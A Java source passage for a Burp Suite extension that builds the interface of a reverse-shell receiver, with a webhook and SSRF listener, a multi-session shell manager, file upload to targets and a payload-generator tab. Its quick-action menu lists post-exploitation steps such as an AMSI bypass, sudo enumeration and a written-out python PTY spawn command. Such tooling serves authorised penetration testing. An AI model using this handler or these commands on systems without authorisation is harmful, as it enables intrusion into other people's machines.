package burp;

import burp.listener.MockRoute;
import burp.listener.PortScanner;
import burp.listener.PortScanner.PortInfo;
import burp.listener.SessionManager;
import burp.listener.ShellSession;
import burp.listener.TlsSocketHelper;
import burp.listener.WebhookResponseConfig;
import burp.payload.PayloadCategory;
import burp.payload.PayloadEncoder;
import burp.payload.PayloadEncoder.EncodingType;
import burp.payload.PayloadRegistry;
import burp.payload.PayloadTemplate;
import burp.payload.PayloadTemplate.PayloadParams;
import burp.ui.AddressChip;
import burp.ui.ModernButton;
import burp.ui.UITheme;

import javax.swing.*;
import javax.swing.border.CompoundBorder;
import javax.swing.border.EmptyBorder;
import javax.swing.border.LineBorder;
import javax.swing.border.TitledBorder;
import javax.swing.event.DocumentEvent;
import javax.swing.event.DocumentListener;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableRowSorter;
import java.awt.*;
import java.awt.datatransfer.StringSelection;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.regex.Pattern;

/**
 * Modern, elegant, and icon-free management panel for Reverse Shell Receiver.
 * Integrates dual-engine Listener, Multi-Session Shell Manager, TLS Sockets,
 * Mock Routes/SSRF Redirector, and Extensive 40+ Payload Generator.
 */
public class ReverseShellReceiverPanel extends JPanel {

    private final IBurpExtenderCallbacks callbacks;
    private final IExtensionHelpers helpers;
    private final ExecutorService ioExecutor = Executors.newCachedThreadPool();

    // --- Listener Core State ---
    private volatile ServerSocket serverSocket;
    private volatile boolean isListening = false;
    private volatile int currentPort = -1;
    private Thread listenerThread;
    private final WebhookResponseConfig webhookConfig = new WebhookResponseConfig();
    private final SessionManager sessionManager;

    // --- Listener Controls ---
    private JComboBox<String> modeCombo;
    private JTextField portField;
    private JCheckBox tlsCheckBox;
    private ModernButton startButton;
    private ModernButton stopButton;
    private ModernButton clearHistoryButton;
    private ModernButton configureResponseButton;
    private ModernButton mockRoutesButton;
    private ModernButton killPortsButton;

    private JTextField statusField;
    private JPanel ipListPanel;
    private JLabel vpnWarningLabel;

    private JPanel modeCardsPanel;
    private static final String CARD_WEBHOOK = "CARD_WEBHOOK";
    private static final String CARD_SHELL = "CARD_SHELL";

    // Webhook UI
    private DefaultTableModel webhookTableModel;
    private JTable webhookTable;
    private TableRowSorter<DefaultTableModel> webhookSorter;
    private JTextField webhookFilterField;
    private final List<RequestEntry> requestHistory = new ArrayList<>();
    private IMessageEditor requestViewer;
    private IMessageEditor responseViewer;

    // Shell UI & Multi-Session
    private JPanel shellTerminalContainer;
    private DefaultTableModel sessionTableModel;
    private JTable sessionTable;
    private JTextField shellInputField;
    private ModernButton shellSendButton;
    private ModernButton shellCtrlCButton;
    private ModernButton shellClearButton;
    private ModernButton uploadFileButton;
    private ModernButton exportLogButton;
    private ModernButton terminateSessionButton;
    private JComboBox<String> quickCommandsCombo;
    private JLabel shellStatusLabel;

    // --- Payload Generator UI Components ---
    private JTextField payloadSearchField;
    private JComboBox<String> payloadCategoryCombo;
    private JComboBox<String> payloadOsCombo;
    private JComboBox<PayloadTemplate> payloadTemplateCombo;
    private JComboBox<String> payloadIpCombo;
    private JTextField payloadPortField;
    private JTextField payloadShellField;
    private JTextField payloadTargetFileField;
    private JComboBox<EncodingType> payloadEncodingCombo;
    private JTextArea payloadDescriptionArea;
    private ITextEditor payloadEditor;

    public ReverseShellReceiverPanel(IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        this.sessionManager = new SessionManager(ioExecutor, callbacks);

        setLayout(new BorderLayout(8, 8));
        setBorder(new EmptyBorder(8, 8, 8, 8));
        setBackground(UITheme.PRIMARY_BG);

        initSessionManagerListener();
        initUI();
    }

    private void initSessionManagerListener() {
        sessionManager.setListener(new SessionManager.ManagerListener() {
            @Override
            public void onSessionAdded(ShellSession session) {
                SwingUtilities.invokeLater(() -> {
                    updateSessionTable();
                    statusField.setText("ACTIVE (" + sessionManager.getActiveSessionCount() + ")");
                    statusField.setBackground(UITheme.STATUS_ACCENT);
                });
            }

            @Override
            public void onSessionSelected(ShellSession session) {
                SwingUtilities.invokeLater(() -> {
                    if (session != null) {
                        displaySessionTerminal(session);
                        shellStatusLabel.setText("SESSION #" + session.getId() + " - " + session.getRemoteAddress() + ":" + session.getRemotePort() + " [" + session.getShellType().getLabel() + "]");
                        shellInputField.setEnabled(session.isActive());
                        shellSendButton.setEnabled(session.isActive());
                        shellCtrlCButton.setEnabled(session.isActive());
                        uploadFileButton.setEnabled(session.isActive());
                        exportLogButton.setEnabled(true);
                        terminateSessionButton.setEnabled(session.isActive());
                        shellInputField.requestFocusInWindow();
                    } else {
                        shellTerminalContainer.removeAll();
                        shellTerminalContainer.revalidate();
                        shellTerminalContainer.repaint();
                        shellStatusLabel.setText("STATUS: NO ACTIVE SESSION");
                        shellInputField.setEnabled(false);
                        shellSendButton.setEnabled(false);
                        shellCtrlCButton.setEnabled(false);
                        uploadFileButton.setEnabled(false);
                        exportLogButton.setEnabled(false);
                        terminateSessionButton.setEnabled(false);
                    }
                    updateSessionTable();
                });
            }

            @Override
            public void onSessionRemoved(ShellSession session) {
                SwingUtilities.invokeLater(() -> {
                    updateSessionTable();
                    int active = sessionManager.getActiveSessionCount();
                    if (active > 0) {
                        statusField.setText("ACTIVE (" + active + ")");
                        statusField.setBackground(UITheme.STATUS_ACCENT);
                    } else if (isListening) {
                        statusField.setText("ONLINE");
                        statusField.setBackground(UITheme.STATUS_SUCCESS);
                    }
                });
            }

            @Override
            public void onSessionStateChanged() {
                SwingUtilities.invokeLater(() -> {
                    updateSessionTable();
                    ShellSession current = sessionManager.getActiveSession();
                    if (current != null) {
                        shellStatusLabel.setText("SESSION #" + current.getId() + " - " + current.getRemoteAddress() + ":" + current.getRemotePort() + " [" + current.getShellType().getLabel() + "]");
                    }
                    int active = sessionManager.getActiveSessionCount();
                    if (active > 0) {
                        statusField.setText("ACTIVE (" + active + ")");
                        statusField.setBackground(UITheme.STATUS_ACCENT);
                    } else if (isListening) {
                        statusField.setText("ONLINE");
                        statusField.setBackground(UITheme.STATUS_SUCCESS);
                    }
                });
            }
        });
    }

    private void initUI() {
        JTabbedPane mainTabs = new JTabbedPane();
        mainTabs.setFont(UITheme.FONT_TITLE);

        // Tab 1: Listener
        JPanel listenerTab = createListenerTab();
        mainTabs.addTab("Listener", listenerTab);

        // Tab 2: Payload Generator
        JPanel payloadTab = createPayloadGeneratorTab();
        mainTabs.addTab("Payload Generator", payloadTab);

        add(mainTabs, BorderLayout.CENTER);
    }

    // =========================================================================
    // LISTENER TAB BUILDER
    // =========================================================================
    private JPanel createListenerTab() {
        JPanel panel = new JPanel(new BorderLayout(8, 8));
        panel.setOpaque(false);

        // --- Top Control & Status Section ---
        JPanel topSection = new JPanel(new BorderLayout(0, 8));
        topSection.setOpaque(false);

        // 1. Control Bar
        JPanel controlBar = new JPanel(new BorderLayout(8, 0));
        controlBar.setBackground(UITheme.CARD_BG);
        controlBar.setBorder(UITheme.createCardBorder());

        // Left Controls (Mode, Port, TLS)
        JPanel leftControls = new JPanel(new FlowLayout(FlowLayout.LEFT, 8, 4));
        leftControls.setOpaque(false);

        JLabel modeLabel = new JLabel("MODE:");
        modeLabel.setFont(UITheme.FONT_SUBTITLE);
        modeLabel.setForeground(UITheme.TEXT_SECONDARY);

        modeCombo = new JComboBox<>(new String[] { "HTTP Webhook", "Reverse Shell" });
        UITheme.styleComboBox(modeCombo);
        modeCombo.setPreferredSize(new Dimension(140, 28));

        JLabel portLabel = new JLabel("PORT:");
        portLabel.setFont(UITheme.FONT_SUBTITLE);
        portLabel.setForeground(UITheme.TEXT_SECONDARY);

        portField = new JTextField("8080", 6);
        UITheme.styleTextField(portField);
        portField.setPreferredSize(new Dimension(68, 28));

        tlsCheckBox = new JCheckBox("TLS/SSL Socket");
        tlsCheckBox.setFont(UITheme.FONT_SMALL);
        tlsCheckBox.setOpaque(false);
        tlsCheckBox.setForeground(UITheme.TEXT_SECONDARY);
        tlsCheckBox.setToolTipText("Enable SSL/TLS listener socket for encrypted reverse shells or HTTPS webhook");

        leftControls.add(modeLabel);
        leftControls.add(modeCombo);
        leftControls.add(Box.createHorizontalStrut(4));
        leftControls.add(portLabel);
        leftControls.add(portField);
        leftControls.add(tlsCheckBox);

        // Right Actions (Buttons)
        JPanel rightActions = new JPanel(new FlowLayout(FlowLayout.RIGHT, 6, 4));
        rightActions.setOpaque(false);

        startButton = new ModernButton("START", UITheme.STATUS_SUCCESS);
        stopButton = new ModernButton("STOP", UITheme.STATUS_DANGER);
        mockRoutesButton = new ModernButton("MOCK ROUTES & SSRF", new Color(71, 85, 105));
        configureResponseButton = new ModernButton("CONFIGURE RESPONSE", new Color(71, 85, 105));
        clearHistoryButton = new ModernButton("CLEAR HISTORY", UITheme.STATUS_INFO);
        killPortsButton = new ModernButton("KILL PORTS", UITheme.STATUS_WARNING);

        stopButton.setEnabled(false);
        clearHistoryButton.setEnabled(false);

        startButton.addActionListener(e -> startListener());
        stopButton.addActionListener(e -> ioExecutor.submit(this::stopListener));
        mockRoutesButton.addActionListener(e -> showMockRoutesDialog());
        configureResponseButton.addActionListener(e -> showResponseConfigDialog());
        clearHistoryButton.addActionListener(e -> clearHistory());
        killPortsButton.addActionListener(e -> killUsedPorts());

        rightActions.add(startButton);
        rightActions.add(stopButton);
        rightActions.add(mockRoutesButton);
        rightActions.add(configureResponseButton);
        rightActions.add(clearHistoryButton);
        rightActions.add(killPortsButton);

        controlBar.add(leftControls, BorderLayout.WEST);
        controlBar.add(rightActions, BorderLayout.EAST);

        // 2. Status Card
        JPanel statusCard = new JPanel(new BorderLayout(14, 0));
        statusCard.setBackground(UITheme.CARD_BG);
        statusCard.setBorder(UITheme.createCardBorder());

        // Status Badge Column
        JPanel statusLeft = new JPanel();
        statusLeft.setLayout(new BoxLayout(statusLeft, BoxLayout.Y_AXIS));
        statusLeft.setOpaque(false);
        statusLeft.setPreferredSize(new Dimension(110, 0));

        statusField = new JTextField("OFFLINE");
        statusField.setEditable(false);
        statusField.setOpaque(true);
        statusField.setBackground(UITheme.STATUS_DANGER);
        statusField.setForeground(Color.WHITE);
        statusField.setFont(UITheme.FONT_TITLE);
        statusField.setHorizontalAlignment(JTextField.CENTER);
        statusField.setBorder(BorderFactory.createEmptyBorder(4, 0, 4, 0));
        statusField.setMaximumSize(new Dimension(100, 26));
        statusField.setAlignmentX(Component.LEFT_ALIGNMENT);

        JLabel statusSub = new JLabel("LISTENER STATUS");
        statusSub.setFont(UITheme.FONT_BADGE);
        statusSub.setForeground(UITheme.TEXT_MUTED);
        statusSub.setAlignmentX(Component.LEFT_ALIGNMENT);

        statusLeft.add(statusField);
        statusLeft.add(Box.createVerticalStrut(4));
        statusLeft.add(statusSub);

        // Listening Addresses Column
        JPanel statusRight = new JPanel(new BorderLayout(0, 3));
        statusRight.setOpaque(false);
        statusRight.setBorder(BorderFactory.createCompoundBorder(
                BorderFactory.createMatteBorder(0, 1, 0, 0, UITheme.BORDER_LIGHT),
                new EmptyBorder(0, 14, 0, 0)));

        JLabel addrHeader = new JLabel("LISTENING ADDRESSES");
        addrHeader.setFont(UITheme.FONT_BADGE);
        addrHeader.setForeground(UITheme.TEXT_SECONDARY);

        ipListPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 2));
        ipListPanel.setOpaque(false);
        JLabel waitingLabel = new JLabel("Listener is currently inactive.");
        waitingLabel.setFont(UITheme.FONT_SMALL);
        waitingLabel.setForeground(UITheme.TEXT_MUTED);
        ipListPanel.add(waitingLabel);

        vpnWarningLabel = new JLabel(" ");
        vpnWarningLabel.setFont(UITheme.FONT_SMALL);
        vpnWarningLabel.setForeground(UITheme.TEXT_MUTED);

        statusRight.add(addrHeader, BorderLayout.NORTH);
        statusRight.add(ipListPanel, BorderLayout.CENTER);
        statusRight.add(vpnWarningLabel, BorderLayout.SOUTH);

        statusCard.add(statusLeft, BorderLayout.WEST);
        statusCard.add(statusRight, BorderLayout.CENTER);

        topSection.add(controlBar, BorderLayout.NORTH);
        topSection.add(statusCard, BorderLayout.CENTER);
        panel.add(topSection, BorderLayout.NORTH);

        // --- Center Display: CardLayout for Webhook & Shell ---
        modeCardsPanel = new JPanel(new CardLayout());
        modeCardsPanel.setOpaque(false);

        JPanel webhookCard = createWebhookPanel();
        JPanel shellCard = createShellPanel();

        modeCardsPanel.add(webhookCard, CARD_WEBHOOK);
        modeCardsPanel.add(shellCard, CARD_SHELL);

        modeCombo.addActionListener(e -> {
            String selectedMode = (String) modeCombo.getSelectedItem();
            CardLayout cl = (CardLayout) modeCardsPanel.getLayout();
            if ("Reverse Shell".equals(selectedMode)) {
                cl.show(modeCardsPanel, CARD_SHELL);
                configureResponseButton.setVisible(false);
                mockRoutesButton.setVisible(false);
                clearHistoryButton.setVisible(false);
            } else {
                cl.show(modeCardsPanel, CARD_WEBHOOK);
                configureResponseButton.setVisible(true);
                mockRoutesButton.setVisible(true);
                clearHistoryButton.setVisible(true);
            }
        });

        panel.add(modeCardsPanel, BorderLayout.CENTER);
        return panel;
    }

    // =========================================================================
    // WEBHOOK PANEL BUILDER
    // =========================================================================
    private JPanel createWebhookPanel() {
        JPanel panel = new JPanel(new BorderLayout(0, 6));
        panel.setOpaque(false);

        // Filter / Search Toolbar
        JPanel filterBar = new JPanel(new BorderLayout(8, 0));
        filterBar.setBackground(UITheme.CARD_BG);
        filterBar.setBorder(new EmptyBorder(4, 8, 4, 8));

        JLabel filterLabel = new JLabel("FILTER REQUESTS:");
        filterLabel.setFont(UITheme.FONT_SUBTITLE);
        filterLabel.setForeground(UITheme.TEXT_SECONDARY);

        webhookFilterField = new JTextField();
        UITheme.styleTextField(webhookFilterField);
        webhookFilterField.setToolTipText("Filter by Method, Path, Client IP, or Timestamp");

        ModernButton clearFilterBtn = new ModernButton("RESET", new Color(100, 116, 139));
        clearFilterBtn.addActionListener(e -> webhookFilterField.setText(""));

        filterBar.add(filterLabel, BorderLayout.WEST);
        filterBar.add(webhookFilterField, BorderLayout.CENTER);
        filterBar.add(clearFilterBtn, BorderLayout.EAST);

        // Webhook History Table
        String[] columns = { "#", "Method", "Path / URL", "Client IP", "Size", "Time" };
        webhookTableModel = new DefaultTableModel(columns, 0) {
            @Override public boolean isCellEditable(int row, int col) { return false; }
        };

        webhookTable = new JTable(webhookTableModel);
        webhookTable.setFont(UITheme.FONT_CODE);
        webhookTable.getTableHeader().setFont(UITheme.FONT_TITLE);
        webhookTable.setRowHeight(24);
        webhookTable.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        webhookTable.setShowGrid(true);
        webhookTable.setGridColor(UITheme.BORDER_LIGHT);

        webhookTable.getColumnModel().getColumn(0).setPreferredWidth(50);
        webhookTable.getColumnModel().getColumn(1).setPreferredWidth(80);
        webhookTable.getColumnModel().getColumn(2).setPreferredWidth(350);
        webhookTable.getColumnModel().getColumn(3).setPreferredWidth(120);
        webhookTable.getColumnModel().getColumn(4).setPreferredWidth(80);
        webhookTable.getColumnModel().getColumn(5).setPreferredWidth(150);

        webhookSorter = new TableRowSorter<>(webhookTableModel);
        webhookTable.setRowSorter(webhookSorter);

        javax.swing.Timer webhookFilterTimer = new javax.swing.Timer(150, evt -> {
            String text = webhookFilterField.getText().trim();
            if (text.isEmpty()) {
                webhookSorter.setRowFilter(null);
            } else {
                webhookSorter.setRowFilter(RowFilter.regexFilter("(?i)" + Pattern.quote(text)));
            }
        });
        webhookFilterTimer.setRepeats(false);

        webhookFilterField.getDocument().addDocumentListener(new DocumentListener() {
            @Override public void insertUpdate(DocumentEvent e) { webhookFilterTimer.restart(); }
            @Override public void removeUpdate(DocumentEvent e) { webhookFilterTimer.restart(); }
            @Override public void changedUpdate(DocumentEvent e) { webhookFilterTimer.restart(); }
        });

        webhookTable.getSelectionModel().addListSelectionListener(e -> {
            if (!e.getValueIsAdjusting()) {
                int viewRow = webhookTable.getSelectedRow();
                if (viewRow >= 0) {
                    int modelRow = webhookTable.convertRowIndexToModel(viewRow);
                    if (modelRow < requestHistory.size()) {
                        RequestEntry entry = requestHistory.get(modelRow);
                        requestViewer.setMessage(entry.fullRequest != null ? entry.fullRequest : new byte[0], true);
                        responseViewer.setMessage(entry.fullResponse != null ? entry.fullResponse : new byte[0], false);
                    }
                }
            }
        });

        JScrollPane tableScroll = new JScrollPane(webhookTable);
        tableScroll.setBorder(new LineBorder(UITheme.BORDER_LIGHT, 1));
        tableScroll.getViewport().setBackground(Color.WHITE);

        // Native Burp Message Editors
        requestViewer = callbacks.createMessageEditor(this.requestController, false);
        responseViewer = callbacks.createMessageEditor(this.requestController, false);
        callbacks.customizeUiComponent(requestViewer.getComponent());
        callbacks.customizeUiComponent(responseViewer.getComponent());

        JPanel reqPanel = new JPanel(new BorderLayout());
        JLabel reqTitle = new JLabel(" INBOUND REQUEST");
        reqTitle.setFont(UITheme.FONT_SUBTITLE);
        reqTitle.setForeground(UITheme.TEXT_SECONDARY);
        reqTitle.setBorder(new EmptyBorder(4, 4, 4, 4));
        reqTitle.setOpaque(true);
        reqTitle.setBackground(UITheme.CARD_HEADER_BG);
        reqPanel.add(reqTitle, BorderLayout.NORTH);
        reqPanel.add(requestViewer.getComponent(), BorderLayout.CENTER);

        JPanel respPanel = new JPanel(new BorderLayout());
        JLabel respTitle = new JLabel(" RETURNED RESPONSE");
        respTitle.setFont(UITheme.FONT_SUBTITLE);
        respTitle.setForeground(UITheme.TEXT_SECONDARY);
        respTitle.setBorder(new EmptyBorder(4, 4, 4, 4));
        respTitle.setOpaque(true);
        respTitle.setBackground(UITheme.CARD_HEADER_BG);
        respPanel.add(respTitle, BorderLayout.NORTH);
        respPanel.add(responseViewer.getComponent(), BorderLayout.CENTER);

        JSplitPane editorSplit = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT, reqPanel, respPanel);
        editorSplit.setResizeWeight(0.5);
        editorSplit.setDividerSize(6);
        editorSplit.setBorder(null);

        JSplitPane mainSplit = new JSplitPane(JSplitPane.VERTICAL_SPLIT, tableScroll, editorSplit);
        mainSplit.setDividerLocation(180);
        mainSplit.setResizeWeight(0.3);
        mainSplit.setDividerSize(6);
        mainSplit.setBorder(null);

        panel.add(filterBar, BorderLayout.NORTH);
        panel.add(mainSplit, BorderLayout.CENTER);
        return panel;
    }

    // =========================================================================
    // SHELL TERMINAL & MULTI-SESSION PANEL BUILDER
    // =========================================================================
    private JPanel createShellPanel() {
        JPanel panel = new JPanel(new BorderLayout(0, 6));
        panel.setOpaque(false);

        // --- Top: Multi-Session Manager Card ---
        JPanel sessionManagerCard = new JPanel(new BorderLayout(8, 4));
        sessionManagerCard.setBackground(UITheme.CARD_BG);
        sessionManagerCard.setBorder(BorderFactory.createCompoundBorder(
                new LineBorder(UITheme.BORDER_LIGHT, 1),
                new EmptyBorder(6, 10, 6, 10)
        ));

        // Session Table
        String[] sessionCols = { "#", "Remote Host", "Port", "OS Type", "Connected At", "Uptime", "Status" };
        sessionTableModel = new DefaultTableModel(sessionCols, 0) {
            @Override public boolean isCellEditable(int row, int col) { return false; }
        };

        sessionTable = new JTable(sessionTableModel);
        sessionTable.setFont(UITheme.FONT_CODE);
        sessionTable.getTableHeader().setFont(UITheme.FONT_SUBTITLE);
        sessionTable.setRowHeight(22);
        sessionTable.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        sessionTable.setShowGrid(true);
        sessionTable.setGridColor(UITheme.BORDER_LIGHT);

        sessionTable.getColumnModel().getColumn(0).setPreferredWidth(40);
        sessionTable.getColumnModel().getColumn(1).setPreferredWidth(120);
        sessionTable.getColumnModel().getColumn(2).setPreferredWidth(60);
        sessionTable.getColumnModel().getColumn(3).setPreferredWidth(110);
        sessionTable.getColumnModel().getColumn(4).setPreferredWidth(140);
        sessionTable.getColumnModel().getColumn(5).setPreferredWidth(90);
        sessionTable.getColumnModel().getColumn(6).setPreferredWidth(80);

        sessionTable.getSelectionModel().addListSelectionListener(e -> {
            if (!e.getValueIsAdjusting()) {
                int row = sessionTable.getSelectedRow();
                if (row >= 0) {
                    int sid = (Integer) sessionTableModel.getValueAt(row, 0);
                    sessionManager.selectSessionById(sid);
                }
            }
        });

        JScrollPane sessionScroll = new JScrollPane(sessionTable);
        sessionScroll.setPreferredSize(new Dimension(0, 85));
        sessionScroll.setBorder(new LineBorder(UITheme.BORDER_LIGHT, 1));

        // Session Manager Actions
        JPanel sessionActions = new JPanel(new FlowLayout(FlowLayout.RIGHT, 6, 0));
        sessionActions.setOpaque(false);

        uploadFileButton = new ModernButton("UPLOAD FILE TO SHELL", UITheme.STATUS_INFO);
        exportLogButton = new ModernButton("EXPORT SESSION LOG", new Color(71, 85, 105));
        terminateSessionButton = new ModernButton("TERMINATE SESSION", UITheme.STATUS_DANGER);

        uploadFileButton.setEnabled(false);
        exportLogButton.setEnabled(false);
        terminateSessionButton.setEnabled(false);

        uploadFileButton.addActionListener(e -> showUploadFileDialog());
        exportLogButton.addActionListener(e -> exportActiveSessionLog());
        terminateSessionButton.addActionListener(e -> {
            ShellSession current = sessionManager.getActiveSession();
            if (current != null) {
                sessionManager.closeSession(current.getId());
            }
        });

        sessionActions.add(uploadFileButton);
        sessionActions.add(exportLogButton);
        sessionActions.add(terminateSessionButton);

        sessionManagerCard.add(new JLabel("ACTIVE REVERSE SHELL SESSIONS:"), BorderLayout.NORTH);
        sessionManagerCard.add(sessionScroll, BorderLayout.CENTER);
        sessionManagerCard.add(sessionActions, BorderLayout.SOUTH);

        // --- Center: Active Session Terminal Display ---
        shellTerminalContainer = new JPanel(new BorderLayout());
        shellTerminalContainer.setBackground(UITheme.TERM_BG);
        shellTerminalContainer.setBorder(new LineBorder(UITheme.BORDER_DARK, 1));

        JLabel waitingShellLabel = new JLabel("Waiting for inbound reverse shell sessions...", SwingConstants.CENTER);
        waitingShellLabel.setFont(UITheme.FONT_CODE);
        waitingShellLabel.setForeground(UITheme.TEXT_MUTED);
        shellTerminalContainer.add(waitingShellLabel, BorderLayout.CENTER);

        // --- Bottom: Assist Bar & Command Input Bar ---
        JPanel shellBottom = new JPanel(new BorderLayout(0, 6));
        shellBottom.setOpaque(false);

        // 1. Assist Bar (Quick commands & Session Status)
        JPanel assistBar = new JPanel(new BorderLayout(8, 0));
        assistBar.setBackground(UITheme.CARD_BG);
        assistBar.setBorder(new EmptyBorder(4, 8, 4, 8));

        shellStatusLabel = new JLabel("STATUS: WAITING FOR INBOUND CONNECTION");
        shellStatusLabel.setFont(UITheme.FONT_SUBTITLE);
        shellStatusLabel.setForeground(UITheme.TEXT_MUTED);

        JPanel quickActionsPanel = new JPanel(new FlowLayout(FlowLayout.RIGHT, 6, 0));
        quickActionsPanel.setOpaque(false);

        JLabel quickLabel = new JLabel("QUICK ACTION:");
        quickLabel.setFont(UITheme.FONT_SUBTITLE);
        quickLabel.setForeground(UITheme.TEXT_SECONDARY);

        quickCommandsCombo = new JComboBox<>(new String[] {
                "Select Command...",
                "Spawn Bash PTY (Python 3)",
                "Spawn Full TTY (Python 3 + Term)",
                "Stabilize Terminal (stty raw -echo; fg)",
                "Whoami & Host (whoami; id; hostname)",
                "OS & Kernel Info (uname -a / systeminfo)",
                "Network Config (ip a / ipconfig)",
                "Check Sudo Permissions (sudo -l)",
                "PowerShell AMSI Bypass (Memory Patch)",
                "PowerShell Reflection Bypass",
                "Clear Terminal Screen"
        });
        UITheme.styleComboBox(quickCommandsCombo);
        quickCommandsCombo.setPreferredSize(new Dimension(240, 26));

        quickCommandsCombo.addActionListener(e -> {
            int idx = quickCommandsCombo.getSelectedIndex();
            if (idx <= 0) return;
            String selected = (String) quickCommandsCombo.getSelectedItem();
            quickCommandsCombo.setSelectedIndex(0);
            executeQuickAction(selected);
        });

        quickActionsPanel.add(quickLabel);
        quickActionsPanel.add(quickCommandsCombo);

        assistBar.add(shellStatusLabel, BorderLayout.WEST);
        assistBar.add(quickActionsPanel, BorderLayout.EAST);

        // 2. Command Input Bar
        JPanel inputBar = new JPanel(new BorderLayout(8, 0));
        inputBar.setBackground(UITheme.CARD_BG);
        inputBar.setBorder(new EmptyBorder(6, 8, 6, 8));

        JLabel promptText = new JLabel("COMMAND >");
        promptText.setFont(UITheme.FONT_CODE_BOLD);
        promptText.setForeground(UITheme.STATUS_INFO);

        shellInputField = new JTextField();
        shellInputField.setFont(UITheme.FONT_CODE);
        shellInputField.setEnabled(false);
        UITheme.styleTextField(shellInputField);

        // Command history navigation
        shellInputField.addKeyListener(new KeyAdapter() {
            @Override
            public void keyPressed(KeyEvent e) {
                ShellSession current = sessionManager.getActiveSession();
                if (current == null) return;
                List<String> hist = current.getCommandHistory();
                if (e.getKeyCode() == KeyEvent.VK_UP && !hist.isEmpty()) {
                    shellInputField.setText(hist.get(hist.size() - 1));
                }
            }
        });

        JPanel inputActions = new JPanel(new FlowLayout(FlowLayout.RIGHT, 6, 0));
        inputActions.setOpaque(false);

        shellSendButton = new ModernButton("SEND", UITheme.STATUS_SUCCESS);
        shellSendButton.setEnabled(false);

        shellCtrlCButton = new ModernButton("CTRL+C", UITheme.STATUS_WARNING);
        shellCtrlCButton.setEnabled(false);

        shellClearButton = new ModernButton("CLEAR", UITheme.STATUS_INFO);

        shellSendButton.addActionListener(e -> sendCurrentShellCommand());
        shellInputField.addActionListener(e -> sendCurrentShellCommand());
        shellCtrlCButton.addActionListener(e -> {
            ShellSession current = sessionManager.getActiveSession();
            if (current != null) current.sendSignalCtrlC(ioExecutor);
        });
        shellClearButton.addActionListener(e -> {
            ShellSession current = sessionManager.getActiveSession();
            if (current != null) current.getDisplayPane().setText("");
        });

        inputActions.add(shellSendButton);
        inputActions.add(shellCtrlCButton);
        inputActions.add(shellClearButton);

        inputBar.add(promptText, BorderLayout.WEST);
        inputBar.add(shellInputField, BorderLayout.CENTER);
        inputBar.add(inputActions, BorderLayout.EAST);

        shellBottom.add(assistBar, BorderLayout.NORTH);
        shellBottom.add(inputBar, BorderLayout.CENTER);

        JSplitPane shellSplit = new JSplitPane(JSplitPane.VERTICAL_SPLIT, sessionManagerCard, shellTerminalContainer);
        shellSplit.setDividerLocation(130);
        shellSplit.setDividerSize(6);
        shellSplit.setBorder(null);

        panel.add(shellSplit, BorderLayout.CENTER);
        panel.add(shellBottom, BorderLayout.SOUTH);
        return panel;
    }

    private void updateSessionTable() {
        sessionTableModel.setRowCount(0);
        List<ShellSession> list = sessionManager.getAllSessions();
        ShellSession active = sessionManager.getActiveSession();

        for (ShellSession s : list) {
            sessionTableModel.addRow(new Object[] {
                    s.getId(),
                    s.getRemoteAddress(),
                    s.getRemotePort(),
                    s.getShellType().getLabel(),
                    s.getConnectedTimeString(),
                    s.getUptime(),
                    s.isActive() ? "ACTIVE" : "CLOSED"
            });
        }

        if (active != null) {
            for (int i = 0; i < sessionTableModel.getRowCount(); i++) {
                if ((Integer) sessionTableModel.getValueAt(i, 0) == active.getId()) {
                    sessionTable.setRowSelectionInterval(i, i);
                    break;
                }
            }
        }
    }

    private void displaySessionTerminal(ShellSession session) {
        shellTerminalContainer.removeAll();
        JScrollPane scroll = new JScrollPane(session.getDisplayPane());
        scroll.setBorder(null);
        scroll.getViewport().setBackground(UITheme.TERM_BG);
        shellTerminalContainer.add(scroll, BorderLayout.CENTER);
        shellTerminalContainer.revalidate();
        shellTerminalContainer.repaint();
    }

    private void sendCurrentShellCommand() {
        ShellSession current = sessionManager.getActiveSession();
        if (current == null || !current.isActive()) return;
        String cmd = shellInputField.getText().trim();
        if (cmd.isEmpty()) return;

        current.sendCommand(cmd, ioExecutor);
        shellInputField.setText("");
    }

    private void showUploadFileDialog() {
        ShellSession current = sessionManager.getActiveSession();
        if (current == null || !current.isActive()) return;

        JFileChooser fc = new JFileChooser();
        fc.setDialogTitle("Select File to Upload to Remote Target");
        if (fc.showOpenDialog(this) == JFileChooser.APPROVE_OPTION) {
            File selectedFile = fc.getSelectedFile();
            String defaultDest = current.getShellType() == ShellSession.SessionShellType.WINDOWS_PS || current.getShellType() == ShellSession.SessionShellType.WINDOWS_CMD
                    ? "C:\\Users\\Public\\" + selectedFile.getName()
                    : "/tmp/" + selectedFile.getName();

            String destPath = JOptionPane.showInputDialog(this, "Enter Destination Remote File Path:", defaultDest);
            if (destPath != null && !destPath.trim().isEmpty()) {
                current.uploadFileChunked(selectedFile, destPath.trim(), ioExecutor);
            }
        }
    }

    private void exportActiveSessionLog() {
        ShellSession current = sessionManager.getActiveSession();
        if (current == null) return;

        JFileChooser fc = new JFileChooser();
        fc.setDialogTitle("Export Session Transcript");
        fc.setSelectedFile(new File("session_" + current.getId() + "_transcript.md"));
        if (fc.showSaveDialog(this) == JFileChooser.APPROVE_OPTION) {
            File target = fc.getSelectedFile();
            try {
                current.exportLogToMarkdown(target);
                JOptionPane.showMessageDialog(this, "Session transcript exported successfully to:\n" + target.getAbsolutePath(), "Exported", JOptionPane.INFORMATION_MESSAGE);
            } catch (IOException e) {
                JOptionPane.showMessageDialog(this, "Error exporting log: " + e.getMessage(), "Error", JOptionPane.ERROR_MESSAGE);
            }
        }
    }

    private void executeQuickAction(String action) {
        ShellSession current = sessionManager.getActiveSession();
        if (current == null || !current.isActive()) return;

        if ("Clear Terminal Screen".equals(action)) {
            current.getDisplayPane().setText("");
            return;
        }

        String cmd = "";
        switch (action) {
            case "Spawn Bash PTY (Python 3)":
                cmd = "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'";
                break;
            case "Spawn Full TTY (Python 3 + Term)":
